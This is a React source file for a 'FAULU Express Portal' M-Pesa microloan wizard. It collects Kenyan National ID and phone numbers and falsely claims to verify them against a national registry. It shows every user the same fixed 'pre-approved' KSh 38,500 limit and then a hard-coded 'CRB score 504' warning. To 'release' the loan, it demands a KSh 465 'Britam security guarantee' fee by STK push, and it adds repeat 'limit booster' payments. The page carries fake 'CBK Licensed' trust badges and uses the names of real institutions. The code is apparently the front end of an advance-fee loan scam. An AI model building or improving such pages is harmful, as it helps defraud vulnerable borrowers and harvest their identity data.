import React, { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  ShieldCheck, 
  AlertTriangle, 
  ArrowRight, 
  CheckCircle2, 
  Sparkles, 
  CreditCard, 
  ChevronRight, 
  RefreshCcw, 
  HelpCircle,
  Clock,
  TrendingUp,
  FileText,
  Lock,
  Phone,
  ArrowLeft,
  Zap,
  Award
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Slider } from "@/components/ui/slider";
import { toast } from "sonner";
import { 
  Step, 
  LoanCategoryType, 
  DisbursementReceipt 
} from "@/types/loan";
import { 
  LOAN_CATEGORIES, 
  calculateDynamicLoanValues, 
  formatKsh 
} from "@/services/loanService";
import { StkPushModal } from "@/components/loan/StkPushModal";

export const FauluLoanWizard: React.FC = () => {
  const [step, setStep] = useState<Step>("id");
  const [nationalId, setNationalId] = useState("");
  const [phone, setPhone] = useState("");
  const [mainChoice, setMainChoice] = useState<"1" | "2" | "3" | null>(null);
  const [loanSubtype, setLoanSubtype] = useState<LoanCategoryType | null>(null);

  // 4x Multiplier custom amount state
  const [multiplierInput, setMultiplierInput] = useState(1000);

  // STK Checkout Modal state
  const [isStkOpen, setIsStkOpen] = useState(false);
  const [stkConfig, setStkConfig] = useState<{
    amount: number;
    packageSize: "SECURED" | "MIN";
    loanType: string;
  }>({
    amount: 465,
    packageSize: "SECURED",
    loanType: "Britam Secured Loan"
  });

  const [lastReceipt, setLastReceipt] = useState<DisbursementReceipt | null>(null);

  // Computed dynamic values
  const dynamicValues = calculateDynamicLoanValues(phone);
  const calculatedFee = dynamicValues.securityFee; // 465 KSh baseline

  // ID & Phone validation
  const handleVerifyIdentification = () => {
    const cleanId = nationalId.trim();
    const cleanPhone = phone.trim();

    if (!cleanId || cleanId.length < 6 || cleanId.length > 10 || !/^\d+$/.test(cleanId)) {
      toast.error("Please enter a valid 6 to 9 digit Kenyan National ID number.");
      return;
    }

    if (!cleanPhone || cleanPhone.length < 9) {
      toast.error("Please enter a valid Kenyan M-Pesa mobile number (e.g. 07XXXXXXXX or 01XXXXXXXX).");
      return;
    }

    toast.success("Identity verified against National Registration Bureau database.");
    setStep("menu");
  };

  // Trigger STK push
  const triggerStkPushRequest = async (packageType: "SECURED" | "MIN", customAmt?: number) => {
    const feeToPay = customAmt || (packageType === "SECURED" ? calculatedFee : dynamicValues.seededRepayment);
    
    setStkConfig({
      amount: feeToPay,
      packageSize: packageType,
      loanType: packageType === "SECURED" 
        ? (loanSubtype ? LOAN_CATEGORIES[loanSubtype].name : "Fast Secured Loan")
        : "4x Limit Booster"
    });

    setIsStkOpen(true);
  };

  const handleReset = () => {
    setStep("id");
    setNationalId("");
    setPhone("");
    setMainChoice(null);
    setLoanSubtype(null);
    setLastReceipt(null);
    toast.info("Session reset.");
  };

  return (
    <div className="w-full max-w-xl mx-auto relative z-10">
      {/* Outer Floating Decorative Ambient Ring */}
      <div className="absolute -inset-1 rounded-[2rem] bg-gradient-to-r from-blue-500/25 via-emerald-500/25 to-indigo-500/25 blur-xl -z-10 opacity-70 animate-pulse" />

      {/* Main Glassmorphic + Claymorphic Container */}
      <div className="glass-panel rounded-[1.75rem] shadow-2xl overflow-hidden border border-white/60 dark:border-white/10 transition-all">
        {/* Top glossy brand header bar */}
        <div className="p-5 md:p-6 pb-4 border-b border-white/40 dark:border-white/10 bg-white/40 dark:bg-black/20 flex items-center justify-between backdrop-blur-md">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-700 text-white flex items-center justify-center font-bold text-xl shadow-[0_4px_12px_rgba(37,99,235,0.35),inset_0_2px_3px_rgba(255,255,255,0.4)]">
              F
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-extrabold text-lg md:text-xl tracking-tight text-foreground">
                  FAULU
                </span>
                <span className="text-[10px] uppercase font-bold tracking-widest px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-500/20">
                  EXPRESS PORTAL
                </span>
              </div>
              <p className="text-[11px] text-muted-foreground font-medium">
                Instant M-Pesa Microloans & Britam Security Escrow
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {step !== "id" && (
              <motion.button
                whileHover={{ scale: 1.1, rotate: 90 }}
                whileTap={{ scale: 0.9 }}
                type="button"
                onClick={handleReset}
                title="Reset Session"
                className="w-8 h-8 rounded-xl bg-white/80 dark:bg-slate-800/80 border border-white/50 dark:border-white/10 flex items-center justify-center text-muted-foreground hover:text-foreground shadow-xs cursor-pointer"
              >
                <RefreshCcw className="w-4 h-4" />
              </motion.button>
            )}
          </div>
        </div>

        {/* Card Content with Fluid Motion Transitions */}
        <div className="p-6 md:p-8 space-y-6">
          <AnimatePresence mode="wait">
            {/* SCREEN 1: NATIONAL ID & PHONE ENTRY */}
            {step === "id" && (
              <motion.div
                key="step-id"
                initial={{ opacity: 0, scale: 0.96, y: 12 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.96, y: -12 }}
                transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
                className="space-y-6"
              >
                <div className="space-y-2">
                  <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 text-xs font-semibold border border-emerald-500/20">
                    <Sparkles className="w-3.5 h-3.5" />
                    <span>Fast Pre-Approved Eligibility Check</span>
                  </div>
                  <h2 className="text-2xl md:text-3xl font-extrabold text-foreground tracking-tight">
                    Check Loan Qualification
                  </h2>
                  <p className="text-xs md:text-sm text-muted-foreground leading-relaxed font-medium">
                    Enter your Kenyan National ID Number and M-Pesa registered mobile line to verify your real-time pre-approved credit threshold.
                  </p>
                </div>

                <div className="space-y-4 pt-1">
                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground tracking-wider uppercase flex items-center justify-between">
                      <span>National ID Number</span>
                      <span className="text-[11px] text-muted-foreground font-normal lowercase font-mono">6-9 digits</span>
                    </label>
                    <div className="relative">
                      <Input
                        type="text"
                        placeholder="e.g. 34891024"
                        value={nationalId}
                        maxLength={9}
                        onChange={(e) => setNationalId(e.target.value.replace(/\D/g, ""))}
                        className="py-6 px-4 text-base font-mono bg-white/80 dark:bg-slate-900/80 border-2 border-white/60 dark:border-white/10 rounded-2xl shadow-inner focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 transition-all"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground tracking-wider uppercase flex items-center justify-between">
                      <span>M-Pesa Mobile Number</span>
                      <span className="text-[11px] text-muted-foreground font-normal lowercase font-mono">Safaricom line</span>
                    </label>
                    <div className="relative">
                      <Input
                        type="tel"
                        placeholder="e.g. 07XXXXXXXX or 01XXXXXXXX"
                        value={phone}
                        maxLength={12}
                        onChange={(e) => setPhone(e.target.value)}
                        className="py-6 px-4 text-base font-mono bg-white/80 dark:bg-slate-900/80 border-2 border-white/60 dark:border-white/10 rounded-2xl shadow-inner focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 transition-all"
                      />
                    </div>
                  </div>
                </div>

                <div className="pt-2">
                  <motion.button
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={handleVerifyIdentification}
                    className="w-full py-4 px-6 text-base font-bold rounded-2xl clay-button-primary flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <span>Verify Identification & Check Limit</span>
                    <ArrowRight className="w-5 h-5" />
                  </motion.button>
                </div>

                <div className="grid grid-cols-3 gap-2 pt-2 border-t border-white/40 dark:border-white/10 text-center">
                  <div className="p-2.5 rounded-xl bg-white/50 dark:bg-slate-800/50 border border-white/40 dark:border-white/10">
                    <ShieldCheck className="w-4 h-4 text-emerald-500 mx-auto mb-1" />
                    <span className="text-[10px] font-semibold text-foreground block">CBK Licensed</span>
                  </div>
                  <div className="p-2.5 rounded-xl bg-white/50 dark:bg-slate-800/50 border border-white/40 dark:border-white/10">
                    <Lock className="w-4 h-4 text-blue-500 mx-auto mb-1" />
                    <span className="text-[10px] font-semibold text-foreground block">256-Bit SSL</span>
                  </div>
                  <div className="p-2.5 rounded-xl bg-white/50 dark:bg-slate-800/50 border border-white/40 dark:border-white/10">
                    <Zap className="w-4 h-4 text-amber-500 mx-auto mb-1" />
                    <span className="text-[10px] font-semibold text-foreground block">Zero Collateral</span>
                  </div>
                </div>
              </motion.div>
            )}

            {/* SCREEN 2: MAIN MENU OPTIONS */}
            {step === "menu" && (
              <motion.div
                key="step-menu"
                initial={{ opacity: 0, scale: 0.96, y: 12 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.96, y: -12 }}
                transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
                className="space-y-5"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <h2 className="text-xl md:text-2xl font-extrabold text-foreground tracking-tight">
                      Select Platform Option
                    </h2>
                    <p className="text-xs text-muted-foreground">
                      ID: <span className="font-mono font-bold text-foreground">{nationalId}</span> • Phone: <span className="font-mono font-bold text-foreground">{phone}</span>
                    </p>
                  </div>
                  <span className="px-2.5 py-1 rounded-full text-xs font-bold bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30 flex items-center gap-1">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    Verified
                  </span>
                </div>

                <div className="space-y-3 pt-1">
                  {/* Option 1: Fast Loan Limit */}
                  <motion.button
                    whileHover={{ scale: 1.02, y: -2 }}
                    whileTap={{ scale: 0.98 }}
                    type="button"
                    onClick={() => {
                      setMainChoice("1");
                      setStep("submenu");
                    }}
                    className="w-full p-4 md:p-5 rounded-2xl bg-white dark:bg-slate-800/90 border-2 border-white/80 dark:border-white/10 shadow-[0_6px_20px_rgba(16,185,129,0.12)] hover:border-emerald-500/50 transition-all text-left flex items-center justify-between group cursor-pointer"
                  >
                    <div className="space-y-1">
                      <div className="flex items-center gap-2.5">
                        <span className="w-7 h-7 rounded-xl bg-emerald-500/15 text-emerald-600 font-bold font-mono text-sm flex items-center justify-center border border-emerald-500/30">
                          1
                        </span>
                        <span className="font-bold text-base text-foreground group-hover:text-emerald-600 transition-colors">
                          Check Fast Loan Limit
                        </span>
                      </div>
                      <p className="text-xs text-muted-foreground pl-9">
                        Instant single-tap pre-qualification review
                      </p>
                    </div>
                    <div className="text-right">
                      <span className="clay-button-emerald px-3 py-1.5 rounded-xl text-xs font-mono font-bold inline-block">
                        KSh 38,500 Qualify →
                      </span>
                    </div>
                  </motion.button>

                  {/* Option 2: Explore Loan Categories */}
                  <motion.button
                    whileHover={{ scale: 1.02, y: -2 }}
                    whileTap={{ scale: 0.98 }}
                    type="button"
                    onClick={() => {
                      setMainChoice("2");
                      setLoanSubtype(null);
                      setStep("submenu");
                    }}
                    className="w-full p-4 md:p-5 rounded-2xl bg-white dark:bg-slate-800/90 border-2 border-white/80 dark:border-white/10 shadow-[0_6px_20px_rgba(37,99,235,0.12)] hover:border-blue-500/50 transition-all text-left flex items-center justify-between group cursor-pointer"
                  >
                    <div className="space-y-1">
                      <div className="flex items-center gap-2.5">
                        <span className="w-7 h-7 rounded-xl bg-blue-500/15 text-blue-600 font-bold font-mono text-sm flex items-center justify-center border border-blue-500/30">
                          2
                        </span>
                        <span className="font-bold text-base text-foreground group-hover:text-blue-600 transition-colors">
                          Explore Loan Categories
                        </span>
                      </div>
                      <p className="text-xs text-muted-foreground pl-9">
                        Salary, Biashara & Emergency loan tracks
                      </p>
                    </div>
                    <div className="text-right">
                      <span className="text-xs font-bold text-blue-600 dark:text-blue-400 flex items-center gap-1 group-hover:translate-x-1 transition-transform">
                        View Types <ChevronRight className="w-4 h-4" />
                      </span>
                    </div>
                  </motion.button>

                  {/* Option 3: Boost Limit / Repayments */}
                  <motion.button
                    whileHover={{ scale: 1.02, y: -2 }}
                    whileTap={{ scale: 0.98 }}
                    type="button"
                    onClick={() => {
                      setMainChoice("3");
                      setStep("repay");
                    }}
                    className="w-full p-4 md:p-5 rounded-2xl bg-white dark:bg-slate-800/90 border-2 border-white/80 dark:border-white/10 shadow-[0_6px_20px_rgba(99,102,241,0.12)] hover:border-indigo-500/50 transition-all text-left flex items-center justify-between group cursor-pointer"
                  >
                    <div className="space-y-1">
                      <div className="flex items-center gap-2.5">
                        <span className="w-7 h-7 rounded-xl bg-indigo-500/15 text-indigo-600 font-bold font-mono text-sm flex items-center justify-center border border-indigo-500/30">
                          3
                        </span>
                        <span className="font-bold text-base text-foreground group-hover:text-indigo-600 transition-colors">
                          Boost Limit / Repayments
                        </span>
                      </div>
                      <p className="text-xs text-muted-foreground pl-9">
                        Accelerated 4x limit multiplier program
                      </p>
                    </div>
                    <div className="text-right">
                      <span className="clay-button-indigo px-3 py-1.5 rounded-xl text-xs font-mono font-bold inline-block">
                        4x Multiplier →
                      </span>
                    </div>
                  </motion.button>
                </div>

                <div className="pt-2 flex items-center justify-between text-xs text-muted-foreground border-t border-white/40 dark:border-white/10">
                  <button
                    type="button"
                    onClick={handleReset}
                    className="hover:text-foreground underline flex items-center gap-1 font-medium"
                  >
                    <span>0. Exit / Change Profile</span>
                  </button>
                </div>
              </motion.div>
            )}

            {/* SCREEN 3: BRANCH ROUTING CONTROLLER (SUBMENU) */}
            {step === "submenu" && (
              <motion.div
                key="step-submenu"
                initial={{ opacity: 0, scale: 0.96, y: 12 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.96, y: -12 }}
                transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
                className="space-y-6"
              >
                {/* Path 1: Fast Loan Offer Details */}
                {mainChoice === "1" && (
                  <div className="space-y-5">
                    {/* Glowing Claymorphic Offer Card */}
                    <div className="clay-card p-6 text-center space-y-3 relative overflow-hidden border border-emerald-500/20">
                      <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-400/10 rounded-full blur-2xl" />
                      
                      <span className="px-3 py-1 rounded-full bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 text-xs font-extrabold uppercase tracking-wider inline-block">
                        Pre-Approved Allocation
                      </span>

                      <h3 className="text-3xl font-extrabold text-foreground tracking-tight">
                        Congratulations!
                      </h3>

                      <div className="py-2">
                        <span className="text-4xl md:text-5xl font-extrabold font-mono text-emerald-600 dark:text-emerald-400 tracking-tight block drop-shadow-sm">
                          KSh 38,500
                        </span>
                        <span className="text-xs text-muted-foreground font-medium">
                          Principal Pre-Approved Limit
                        </span>
                      </div>

                      <p className="text-xs md:text-sm text-muted-foreground max-w-sm mx-auto">
                        Fast, safe & flexible disbursement window direct to your M-Pesa wallet.
                      </p>
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <div className="p-3.5 rounded-2xl bg-white/70 dark:bg-slate-800/70 border border-white/60 dark:border-white/10 shadow-xs">
                        <span className="text-[11px] text-muted-foreground block font-medium">Disbursement Speed</span>
                        <span className="font-bold text-sm text-foreground">Instant M-Pesa</span>
                      </div>
                      <div className="p-3.5 rounded-2xl bg-white/70 dark:bg-slate-800/70 border border-white/60 dark:border-white/10 shadow-xs">
                        <span className="text-[11px] text-muted-foreground block font-medium">Repayment Tenure</span>
                        <span className="font-bold text-sm text-foreground">30-60 Days</span>
                      </div>
                    </div>

                    <motion.button
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      onClick={() => setStep("crb")}
                      className="w-full py-4 px-6 text-base font-bold rounded-2xl clay-button-primary flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <span>Continue Application</span>
                      <ArrowRight className="w-5 h-5" />
                    </motion.button>
                  </div>
                )}

                {/* Path 2: Subcategory Breakdown Selector */}
                {mainChoice === "2" && !loanSubtype && (
                  <div className="space-y-5">
                    <div>
                      <h2 className="text-xl md:text-2xl font-extrabold text-foreground tracking-tight">
                        Select Loan Category
                      </h2>
                      <p className="text-xs text-muted-foreground">
                        Select repayment period target track:
                      </p>
                    </div>

                    <div className="space-y-3">
                      {(Object.keys(LOAN_CATEGORIES) as LoanCategoryType[]).map((catKey) => {
                        const item = LOAN_CATEGORIES[catKey];
                        return (
                          <motion.button
                            key={catKey}
                            whileHover={{ scale: 1.02, y: -2 }}
                            whileTap={{ scale: 0.98 }}
                            type="button"
                            onClick={() => setLoanSubtype(catKey)}
                            className="w-full p-4 rounded-2xl bg-white dark:bg-slate-800/90 border-2 border-white/80 dark:border-white/10 shadow-md hover:border-blue-500/50 transition-all text-left flex items-center justify-between group cursor-pointer"
                          >
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <span className="font-bold text-base text-foreground group-hover:text-blue-600">
                                  {item.name}
                                </span>
                                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-500/15 text-blue-600 dark:text-blue-400">
                                  {item.badge}
                                </span>
                              </div>
                              <p className="text-xs text-muted-foreground">
                                Limit {formatKsh(item.principal)} • {item.tenure}
                              </p>
                            </div>
                            <div className="text-right">
                              <div className="text-sm font-mono font-bold text-foreground">
                                Repay {formatKsh(item.repayment)}
                              </div>
                              <div className="text-[11px] font-semibold text-emerald-600">
                                Interest {formatKsh(item.interest)}
                              </div>
                            </div>
                          </motion.button>
                        );
                      })}
                    </div>
                  </div>
                )}

                {/* Path 2 Step 2: Category Configured Preview */}
                {mainChoice === "2" && loanSubtype && (
                  <div className="space-y-5">
                    <div className="clay-card p-6 space-y-4 border border-blue-500/20">
                      <div className="flex items-center justify-between">
                        <span className="px-3 py-1 rounded-full text-xs font-bold bg-blue-500 text-white shadow-xs capitalize">
                          {LOAN_CATEGORIES[loanSubtype].name} Configured
                        </span>
                        <span className="text-xs font-mono font-semibold text-muted-foreground">
                          {LOAN_CATEGORIES[loanSubtype].tenure}
                        </span>
                      </div>

                      <div className="text-center py-2 space-y-1">
                        <span className="text-xs font-bold text-muted-foreground uppercase tracking-widest">
                          Approved Limit
                        </span>
                        <div className="font-mono text-4xl font-extrabold text-blue-600 dark:text-blue-400">
                          {formatKsh(LOAN_CATEGORIES[loanSubtype].principal)}
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3 pt-3 border-t border-border">
                        <div className="p-3 bg-muted/40 rounded-xl">
                          <span className="text-[10px] font-medium text-muted-foreground block">Total Repayment</span>
                          <span className="font-mono font-bold text-sm text-foreground">
                            {formatKsh(LOAN_CATEGORIES[loanSubtype].repayment)}
                          </span>
                        </div>
                        <div className="p-3 bg-muted/40 rounded-xl">
                          <span className="text-[10px] font-medium text-muted-foreground block">Interest Fee</span>
                          <span className="font-mono font-bold text-sm text-emerald-600">
                            {formatKsh(LOAN_CATEGORIES[loanSubtype].interest)}
                          </span>
                        </div>
                      </div>

                      <p className="text-xs text-muted-foreground leading-relaxed">
                        {LOAN_CATEGORIES[loanSubtype].description}
                      </p>
                    </div>

                    <motion.button
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      onClick={() => setStep("crb")}
                      className="w-full py-4 px-6 text-base font-bold rounded-2xl clay-button-primary flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <span>Confirm & Continue</span>
                      <ArrowRight className="w-5 h-5" />
                    </motion.button>
                  </div>
                )}

                <div className="text-center pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      setStep("menu");
                      setLoanSubtype(null);
                    }}
                    className="text-xs text-muted-foreground hover:text-foreground underline flex items-center justify-center gap-1 mx-auto font-medium"
                  >
                    <ArrowLeft className="w-3.5 h-3.5" />
                    ← Return to Main Options
                  </button>
                </div>
              </motion.div>
            )}

            {/* SCREEN 4: CRB SCORE INTERCEPT / BRITAM LOGIC */}
            {step === "crb" && (
              <motion.div
                key="step-crb"
                initial={{ opacity: 0, scale: 0.96, y: 12 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.96, y: -12 }}
                transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
                className="space-y-6"
              >
                {/* CRB Warning Box */}
                <div className="p-4 rounded-2xl border-2 border-amber-500/40 bg-amber-500/10 dark:bg-amber-500/15 space-y-2 shadow-sm">
                  <div className="flex items-center gap-2 text-amber-900 dark:text-amber-300 font-bold text-sm">
                    <AlertTriangle className="w-5 h-5 shrink-0 text-amber-600 dark:text-amber-400 animate-bounce" />
                    <span>⚠️ CRB Assessment Warning</span>
                  </div>
                  <p className="text-xs text-amber-950 dark:text-amber-100 leading-relaxed font-medium">
                    Your CRB score is <strong className="font-mono underline text-amber-700 dark:text-amber-300">504 (Risky Loan)</strong> due to ongoing active profile liabilities.
                  </p>
                  <p className="text-[11px] text-amber-900/80 dark:text-amber-300/80">
                    We partner with <strong>Britam Insurance</strong> to guarantee and secure this allocation.
                  </p>
                </div>

                {/* Approved Secured Loan Breakdown */}
                <div className="clay-card p-6 space-y-5 border border-emerald-500/20">
                  <div className="flex items-center justify-between border-b border-border pb-3">
                    <div>
                      <span className="text-[11px] font-bold text-muted-foreground uppercase tracking-wider block">
                        Guaranteed Allocation
                      </span>
                      <span className="text-2xl font-extrabold text-emerald-600 dark:text-emerald-400 font-mono">
                        Approved: KSh 22,500
                      </span>
                    </div>
                    <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30">
                      Britam Secured
                    </span>
                  </div>

                  <div className="flex items-center justify-between text-xs py-1 bg-muted/40 p-3 rounded-xl">
                    <span className="text-muted-foreground font-medium">Required Security Guarantee:</span>
                    <span className="font-mono font-extrabold text-foreground text-base">
                      {formatKsh(calculatedFee)}
                    </span>
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground uppercase tracking-wider">
                      Disbursement M-Pesa Mobile Number
                    </label>
                    <Input
                      type="tel"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="e.g. 07XXXXXXXX"
                      className="text-center font-mono py-5 bg-white/80 dark:bg-slate-900/80 rounded-xl text-base font-bold"
                    />
                  </div>

                  <motion.button
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => triggerStkPushRequest("SECURED", calculatedFee)}
                    className="w-full py-4 px-6 text-base font-bold rounded-2xl clay-button-emerald flex items-center justify-center gap-2 cursor-pointer shadow-lg"
                  >
                    <span>Release Loan via M-Pesa ({formatKsh(calculatedFee)})</span>
                    <ArrowRight className="w-5 h-5" />
                  </motion.button>
                </div>

                <div className="text-center">
                  <button
                    type="button"
                    onClick={() => setStep("menu")}
                    className="text-xs text-muted-foreground hover:text-foreground underline font-medium"
                  >
                    Cancel Request
                  </button>
                </div>
              </motion.div>
            )}

            {/* SCREEN 5: PATH 3 SPECIFIC - BOOST LIMIT REPAYMENTS */}
            {step === "repay" && (
              <motion.div
                key="step-repay"
                initial={{ opacity: 0, scale: 0.96, y: 12 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.96, y: -12 }}
                transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
                className="space-y-6"
              >
                <div>
                  <h2 className="text-xl md:text-2xl font-extrabold text-foreground tracking-tight">
                    Boost Limit / Repayments
                  </h2>
                  <p className="text-xs text-muted-foreground">
                    Repay your current balance or contribute towards the 4x Multiplier Limit booster:
                  </p>
                </div>

                {/* Option 1: Pay Full Balance */}
                <div className="p-4 rounded-2xl bg-white dark:bg-slate-800/90 border border-white/80 dark:border-white/10 shadow-sm space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="font-bold text-sm text-foreground">1. Pay Full Balance</span>
                      <p className="text-xs text-muted-foreground">Clear current maintenance fee</p>
                    </div>
                    <span className="font-mono font-extrabold text-foreground text-lg">KSh 61</span>
                  </div>
                  <Button
                    variant="outline"
                    onClick={() => triggerStkPushRequest("MIN", 61)}
                    className="w-full text-xs font-bold py-4 rounded-xl border-2"
                  >
                    Pay Full Balance (KSh 61) via M-Pesa
                  </Button>
                </div>

                {/* Option 2: 4x Multiplier Dynamic Booster */}
                <div className="clay-card p-6 space-y-5 border border-indigo-500/30">
                  <div className="flex items-center justify-between">
                    <span className="px-3 py-1 rounded-full text-xs font-extrabold bg-indigo-600 text-white shadow-xs">
                      4x Multiplier Program
                    </span>
                    <span className="text-xs text-muted-foreground font-semibold">After 1 Month</span>
                  </div>

                  <div className="space-y-2">
                    <div className="flex justify-between text-xs">
                      <span className="text-muted-foreground font-medium">Repay Amount / Month:</span>
                      <span className="font-mono font-extrabold text-foreground text-sm">{formatKsh(multiplierInput)}</span>
                    </div>
                    <Slider
                      value={[multiplierInput]}
                      min={400}
                      max={5000}
                      step={100}
                      onValueChange={(val) => setMultiplierInput(val[0])}
                      className="py-2"
                    />
                  </div>

                  <div className="p-4 bg-indigo-500/10 rounded-2xl border border-indigo-500/20 text-center space-y-1">
                    <span className="text-[11px] font-bold text-indigo-700 dark:text-indigo-300 uppercase tracking-wider">
                      Unlocked Next Month Loan Limit (4x)
                    </span>
                    <div className="font-mono text-3xl md:text-4xl font-extrabold text-indigo-600 dark:text-indigo-400">
                      {formatKsh(multiplierInput * 4)}
                    </div>
                    <p className="text-xs text-muted-foreground">
                      e.g. Repay {formatKsh(multiplierInput)} = Loan {formatKsh(multiplierInput * 4)}
                    </p>
                  </div>

                  <motion.button
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => triggerStkPushRequest("MIN", multiplierInput)}
                    className="w-full py-4 px-6 text-base font-bold rounded-2xl clay-button-indigo flex items-center justify-center gap-2 cursor-pointer shadow-lg"
                  >
                    <span>Pay {formatKsh(multiplierInput)} via M-PESA</span>
                    <ArrowRight className="w-5 h-5" />
                  </motion.button>
                </div>

                <div className="text-center pt-2">
                  <button
                    type="button"
                    onClick={() => setStep("menu")}
                    className="text-xs text-muted-foreground hover:text-foreground underline flex items-center justify-center gap-1 mx-auto font-medium"
                  >
                    <ArrowLeft className="w-3.5 h-3.5" />
                    ← Back to Main Menu
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      {/* STK Push M-Pesa Modal */}
      <StkPushModal
        isOpen={isStkOpen}
        onClose={() => setIsStkOpen(false)}
        phone={phone}
        nationalId={nationalId}
        amount={stkConfig.amount}
        loanType={stkConfig.loanType}
        packageSize={stkConfig.packageSize}
        onSuccess={(receipt) => {
          setLastReceipt(receipt);
        }}
      />
    </div>
  );
};
